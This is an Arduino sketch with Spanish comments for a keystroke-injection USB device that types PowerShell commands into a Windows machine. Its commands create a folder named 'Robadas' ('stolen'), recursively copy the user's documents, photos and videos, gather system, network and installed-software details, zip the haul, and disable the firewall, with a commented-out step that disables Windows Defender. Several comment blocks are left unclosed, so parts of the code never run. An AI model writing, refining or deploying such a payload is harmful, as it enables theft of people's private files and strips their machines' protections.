#include <Keyboard.h>
#define powershell "powershell"
  String creacion = "New-Item -Path 'C:\\Users\\Public\\Documents\\Robadas' -Type Directory";
 String ubicacion = "Set-location 'C:\\Users\\Public\\Documents'";
 String cd = "cd..";
void setup() {
  Keyboard.begin();
  Keyboard.releaseAll();
  delay(1000);
  Keyboard.press(KEY_LEFT_GUI) + Keyboard.press('r');
  delay(1000);
  Keyboard.releaseAll();
  delay(1000);
  Keyboard.print("powerShell");
  Keyboard.release(KEY_RETURN);
    delay(1000);
  Keyboard.releaseAll();
  delay(1000);
  Keyboard.press(KEY_LEFT_CTRL) + Keyboard.press(KEY_LEFT_SHIFT) + Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
  delay(1000);
  Keyboard.press(KEY_LEFT_ALT) + Keyboard.press('s');
  Keyboard.releaseAll();
  
  delay(1000);
  COPY_DOC();
  COP_DATOS();
  DESACT_FIRE();
  Keyboard.end();
  

}

void loop() {

}
void COP_DATOS() {
  Keyboard.releaseAll();
  delay(1000);
  /**
 * DATOS DISCO

Keyboard.println("get-disk | Out-File -FilePath C:\\Users\\Public\\Documents\\Robadas\\informacion\\DatosDeDiscos.txt");
Keyboard.press(KEY_RETURN) + Keyboard.release(KEY_RETURN);
delay(1000);
/**
 * DATOS DE RED
*/
Keyboard.println("get-Netadapter | Out-File -FilePath C:\\Users\\Public\\Documents\\Robadas\\informacion\\DatosAdaptadoresRed.txt");
Keyboard.press(KEY_RETURN) + Keyboard.release(KEY_RETURN);
delay(1000);
/**
 * DATOS DE APLICACIONES
*/
Keyboard.println("Get-WmiObject -class win32_Product | Out-File -FilePath C:\\Users\\Public\\Documents\\Robadas\\informacion\\AplicacionesInstaladas.txt");
Keyboard.press(KEY_RETURN) + Keyboard.release(KEY_RETURN);
delay(1000);
/**
 * DATOS DE LA COMPUTADORA
*/
Keyboard.println("Get-WmiObject Win32_ComputerSystem | Out-File -FilePath C:\\Users\\Public\\Documents\\Robadas\\informacion\\Datosdelacomputadora.txt");
Keyboard.press(KEY_RETURN) + Keyboard.release(KEY_RETURN);
delay(1000);
/**
 * INFORMACION DEL SISTEMA
*/
Keyboard.println("systeminfo| Out-File -FilePath C:\\Users\\Public\\Documents\\Robadas\\informacion\\informacionSistema.txt");
Keyboard.press(KEY_RETURN) + Keyboard.release(KEY_RETURN);
delay(1000);

  Keyboard.println("Compress-archive -Path C:\\Users\\Public\\Documents\\Robadas -DestinationPath C:\\Users\\Public\\Documents\\Cositas.zip");
  Keyboard.press(KEY_RETURN) + Keyboard.release(KEY_RETURN);
  delay(2000);
}
void COPY_DOC(){
  /**
 * CREACION DE CARPETA
*/
Keyboard.releaseAll();
  delay(1000);
  Keyboard.println(creacion);
  delay(1000);
  Keyboard.press(KEY_RETURN) + Keyboard.release(KEY_RETURN);
  Keyboard.releaseAll();
  Keyboard.println(ubicacion);
    Keyboard.press(KEY_RETURN) + Keyboard.release(KEY_RETURN);
  delay(1000);
    Keyboard.releaseAll();
      delay(1000);
    Keyboard.println("cd Robadas");
    delay(1000);
    Keyboard.press(KEY_RETURN) + Keyboard.release(KEY_RETURN);
    delay(500);
    Keyboard.println("New-Item -Path 'C:\\Users\\Public\\Documents\\Robadas\\informacion' -Type Directory | New-Item -Path 'C:\\Users\\Public\\Documents\\Robadas\\imagenes' -Type Directory | New-Item -Path 'C:\\Users\\Public\\Documents\\Robadas\\documentos' -Type Directory | New-Item -Path 'C:\\Users\\Public\\Documents\\Robadas\\videos' -Type Directory");
  /**
 * COPIA DE ARCHIVOS DISCO C PRINCIPAL
*/ 
  delay(1000);
  Keyboard.println("Get-ChildItem C:\\Users -Filter *.docx -Recurse | Copy-Item -Destination C:\\Users\\Public\\Documents\\Robadas\\documentos");
  Keyboard.press(KEY_RETURN) + Keyboard.release(KEY_RETURN);
    delay(1000);
    Keyboard.releaseAll();
  Keyboard.println("Get-ChildItem C:\\Users -Filter *.jpg -Recurse | Copy-Item -Destination C:\\Users\\Public\\Documents\\Robadas\\imagenes");
  Keyboard.press(KEY_RETURN) + Keyboard.release(KEY_RETURN);
  delay(1000);
  Keyboard.releaseAll();
    Keyboard.println("Get-ChildItem C:\\Users -Filter *.mp4 -Recurse | Copy-Item -Destination C:\\Users\\Public\\Documents\\Robadas\\videos");
  Keyboard.press(KEY_RETURN) + Keyboard.release(KEY_RETURN);
  delay(1000);

    /**
 * COPIA DE ARCHIVOS DISCO D
*/ 
  Keyboard.releaseAll();
    Keyboard.println("Get-ChildItem D: -Filter *.docx -Recurse | Copy-Item -Destination C:\\Users\\Public\\Documents\\Robadas\\documentos");
  Keyboard.press(KEY_RETURN) + Keyboard.release(KEY_RETURN);
    delay(1000);
    Keyboard.releaseAll();
  Keyboard.println("Get-ChildItem D: -Filter *.jpg -Recurse | Copy-Item -Destination C:\\Users\\Public\\Documents\\Robadas\\imagenes");
  Keyboard.press(KEY_RETURN) + Keyboard.release(KEY_RETURN);
  delay(1000);
  Keyboard.releaseAll();
    Keyboard.println("Get-ChildItem D: -Filter *.mp4 -Recurse | Copy-Item -Destination C:\\Users\\Public\\Documents\\Robadas\\videos");
  Keyboard.press(KEY_RETURN) + Keyboard.release(KEY_RETURN);
  delay(1000);

   /**
 * COPIA DE ARCHIVOS DISCO E

Keyboard.releaseAll();
    Keyboard.println("Get-ChildItem E: -Filter *.docx -Recurse | Copy-Item -Destination C:\\Users\\Public\\Documents\\Robadas\\documentos");
  Keyboard.press(KEY_RETURN) + Keyboard.release(KEY_RETURN);
    delay(1000);
    Keyboard.releaseAll();
  Keyboard.println("Get-ChildItem E: -Filter *.jpg -Recurse | Copy-Item -Destination C:\\Users\\Public\\Documents\\Robadas\\imagenes");
  Keyboard.press(KEY_RETURN) + Keyboard.release(KEY_RETURN);
  delay(1000);
  Keyboard.releaseAll();
    Keyboard.println("Get-ChildItem E: -Filter *.mp4 -Recurse | Copy-Item -Destination C:\\Users\\Public\\Documents\\Robadas\\videos");
  Keyboard.press(KEY_RETURN) + Keyboard.release(KEY_RETURN);
  delay(1000);
    /**
 * COPIA DE ARCHIVOS DISCO F

Keyboard.releaseAll();
    Keyboard.println("Get-ChildItem F: -Filter *.docx -Recurse | Copy-Item -Destination C:\\Users\\Public\\Documents\\Robadas\\documentos");
  Keyboard.press(KEY_RETURN) + Keyboard.release(KEY_RETURN);
    delay(1000);
    Keyboard.releaseAll();
  Keyboard.println("Get-ChildItem F: -Filter *.jpg -Recurse | Copy-Item -Destination C:\\Users\\Public\\Documents\\Robadas\\imagenes");
  Keyboard.press(KEY_RETURN) + Keyboard.release(KEY_RETURN);
  delay(1000);
  Keyboard.releaseAll();
    Keyboard.println("Get-ChildItem F: -Filter *.mp4 -Recurse | Copy-Item -Destination C:\\Users\\Public\\Documents\\Robadas\\videos");
  Keyboard.press(KEY_RETURN) + Keyboard.release(KEY_RETURN);
  delay(1000);
*/ 
  /**
 *COMPRESION DE ARCHIVOS ZIP 
*/
  
    }

  void DESACT_FIRE() {
  delay(500);
/**
 * DESACTIVACION DE WINDOWS DEFENDER

  Keyboard.println("Set-MpPreference -DisableRealtimeMonitoring $true");
  Keyboard.press(KEY_RETURN) + Keyboard.release(KEY_RETURN);
  delay(100);

  /**
 * DESACTIVACION DE FIREWALL
*/
  Keyboard.println("Set-NetFirewallProfile Domain,Public,Private -Enabled False");
  Keyboard.press(KEY_RETURN) + Keyboard.release(KEY_RETURN);
  delay(100);

  
}
